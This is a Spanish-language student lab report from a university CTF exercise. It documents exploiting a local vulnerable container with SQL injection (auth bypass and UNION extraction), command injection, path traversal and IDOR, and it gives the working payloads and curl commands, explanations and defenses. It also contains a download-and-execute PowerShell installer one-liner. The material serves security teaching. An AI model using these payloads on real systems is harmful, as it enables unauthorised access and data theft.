# Informe — Laboratorio 07 · Explotación

> Copiala a `entregas/lab07/grupoXX/informe.md`. Borrá las notas en cursiva.

**Grupo:** 02

**Integrantes:**

| Nombre y apellido | Legajo | Usuario de GitHub |
|---|---|---|
| Romero Jimena Soledad | 15377 | @Jimena-Romero |
| Milanesio Hebe Del Lourdes | 15343 | @hebemilanesio1 |
| Toranzo Juan Cruz | 15308 | @JuanToranzo |
| Torres Damaris | 14563 | @damaris412 |


## 0. Declaración de uso de IA
Se utilizó Claude (Anthropic) como asistente para: entender la lógica de cada vulnerabilidad, redactar la reconstrucción de las queries/comandos/rutas resultantes de cada payload, y dar formato a las respuestas de análisis (P1–P5) y al research. Los payloads fueron verificados ejecutándolos contra el target phantomcorp del entorno del lab.

## 1. Flags capturadas

1. Levantar el entorno del lab

$ ./ctf status 07

  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                      │
  ╰────────────────────────────────────────────────────────────╯

   ·  R1     SQLi - bypass de autenticacion
   ·  R2     SQLi - extraccion de datos con UNION
   ·  R3     Inyeccion de comandos (RCE)
   ·  R4     Path traversal / LFI
   ·  R5     IDOR - control de acceso roto

  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░  0/5 (0%)

Tuvimos que instalar make con Chocolatey

Comandos: 

* Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

* choco install make -y

* make --version

2. Se levantó el entorno del Lab 07 con ./ctf lab 07, que construyó y arrancó dos contenedores Docker en la red cyberlab_labnet: cyberlab-attacker (consola atacante, con nmap, curl, gobuster, etc.) y cyberlab-phantomcorp (el target vulnerable). El build tardó ~134s por ser la primera vez (descarga de imágenes base). Con el entorno arriba, se accede a la consola atacante mediante make shell.

3. Correr el comando make shell

$ make shell
docker exec -e LLM_PROVIDER -e LLM_MODEL -e ANTHROPIC_API_KEY -e OPENAI_API_KEY -it cyberlab-attacker bash || \
  echo "No hay consola corriendo. Levant├í un lab primero:  make lab N=05"

  ┌───────────────────────────────────────────────────────┐
  │  CONSOLA DEL ATACANTE · CyberLab UTN FRVM              │
  │                                                        │
  │  Tools listas:  nmap  ncat  curl  whois  dig  python3  │
  │  Guardá evidencia en /loot (se comparte con tu repo).  │
  │  El target del lab activo se llama:  phantomcorp       │
  │                                                        │
  │  Probá para arrancar:   nmap -Pn phantomcorp           │
  └───────────────────────────────────────────────────────┘
root@attacker:/loot# 

4. Luego de seguir los comandos de la sección 4, ./ctf status 07 arroja lo siguiente:

$ ./ctf status 07

  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 07                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     SQLi - bypass de autenticacion
   ✓  R2     SQLi - extraccion de datos con UNION
   ✓  R3     Inyeccion de comandos (RCE)
   ✓  R4     Path traversal / LFI
   ✓  R5     IDOR - control de acceso roto

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 07 COMPLETO! Ponete las pilas con la próxima unidad.

## 2. Tabla de explotación

| Vuln | Payload usado | Consulta/comando/ruta resultante | Impacto | Defensa concreta |
|---|---|---|---|---|
| SQLi auth (R1) | `user=admin' --` | `SELECT user, rol FROM users WHERE user='admin' --' AND pass='...'` | Bypass total de autenticación, acceso como admin sin conocer la contraseña | Consultas parametrizadas (placeholders `?` / bind params); nunca concatenar input del usuario en el SQL |
| SQLi UNION (R2) | `q=xyz' UNION SELECT clave, valor FROM secrets --` | `SELECT nombre, precio FROM productos WHERE nombre LIKE '%xyz' UNION SELECT clave, valor FROM secrets --%'` | Exfiltración de la tabla `secrets`, fuera del alcance previsto de la consulta original | Parametrizar la consulta; no devolver mensajes de error SQL crudos al cliente |
| Command injection (R3) | `host=127.0.0.1; cat /app/flags/cmdi.txt` | `ping -c1 127.0.0.1; cat /app/flags/cmdi.txt 2>&1` | Ejecución arbitraria de comandos (RCE) en el servidor | Usar `subprocess.run([...], shell=False)` con lista fija de argumentos; validar `host` contra un formato esperado antes de usarlo |
| Path traversal (R4) | `archivo=../flags/lfi.txt` | `open("/app/public/../flags/lfi.txt")` → resuelve a `/app/flags/lfi.txt` | Lectura de archivos fuera del directorio público (`public/`) | Resolver la ruta final con `os.path.realpath()` y verificar que siga dentro del directorio base permitido |
| IDOR (R5) | `id=1` | `SELECT id,user,rol,nota_privada FROM users WHERE id=?` (sin validar que el `id` pertenezca al usuario autenticado) | Lectura de datos privados de otro usuario (nota privada del admin) | Verificar en el servidor que el `id` solicitado coincida con el usuario autenticado en la sesión, o que su rol lo autorice |

## 3. Preguntas de análisis

**P1 — ¿Por qué funciona el bypass? (con la query del R1)**

Con `user=admin' --`, la query queda:
```sql
SELECT user, rol FROM users WHERE user='admin' --' AND pass='x'
```
El `--` abre un comentario SQL: todo lo que sigue se ignora. El motor termina ejecutando solo `WHERE user='admin'`, sin evaluar nunca la contraseña. El servidor mezcló código SQL con dato del usuario en el mismo string, y ese dato terminó alterando la lógica de la consulta.

**P2 — ¿Por qué el UNION necesita el mismo número de columnas?**

`UNION` concatena filas de dos `SELECT` alineándolas columna por columna; si no coincide la cantidad, el motor no puede armar una tabla rectangular y tira error. Sin saber el número de antemano, se puede averiguar probando `' ORDER BY 1--`, `' ORDER BY 2--`... hasta que falle, o con `' UNION SELECT NULL--`, sumando un `NULL` a la vez hasta que deje de dar error.

**P3 — ¿Qué sigue después del RCE?**

Un atacante real no se queda con un comando suelto: busca **persistencia** (webshell, cron job, clave SSH propia) para no depender de reexplotar la misma falla, y desde ahí intenta **escalar privilegios** y moverse lateralmente por la red interna. 

**P4 — ¿Por qué parametrizar mata la SQLi de raíz?**

Parametrizar separa la consulta (fija, `WHERE user=? AND pass=?`) de los valores, que se envían por un canal aparte y se insertan recién después de que el motor ya compiló la query. Así, el input del usuario siempre se trata como dato literal, nunca como sintaxis SQL — aunque contenga comillas o `--`, no hay forma de que altere la estructura de la consulta.

**P5 — IDOR: ¿por qué el control de acceso no puede depender del cliente?**

Cualquier valor que viaje en el request (como el `id` en la URL) está bajo control total del atacante — se puede editar a mano, como hicimos con `curl`. Confiar en que "el cliente no lo va a cambiar" no es una defensa real. La verificación tiene que hacerse **en el servidor**, comparando el recurso pedido contra el usuario autenticado en la sesión, antes de devolver cualquier dato.

## 4. Bitácora de comandos

### Preparación del entorno
Se instaló `make` vía Chocolatey (no viene por defecto en Git Bash/MINGW64):
```bash
choco install make -y
```
Luego se levantó el entorno con `./ctf lab 07` (build de los contenedores `cyberlab-attacker` y `cyberlab-phantomcorp` en la red `cyberlab_labnet`) y se accedió a la consola atacante con `make shell`.

### Explotación
```bash
# R1 — SQLi bypass de autenticación
curl -s -X POST http://phantomcorp/login --data-urlencode "user=admin' --" --data-urlencode "pass=x"

# R2 — SQLi UNION
curl -s -G http://phantomcorp/buscar --data-urlencode "q=xyz' UNION SELECT clave, valor FROM secrets --"

# R3 — Command injection
curl -s -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1; cat /app/flags/cmdi.txt"

# R4 — Path traversal
curl -s -G http://phantomcorp/descargar --data-urlencode "archivo=../flags/lfi.txt"

# R5 — IDOR
curl -s "http://phantomcorp/perfil?id=1"
```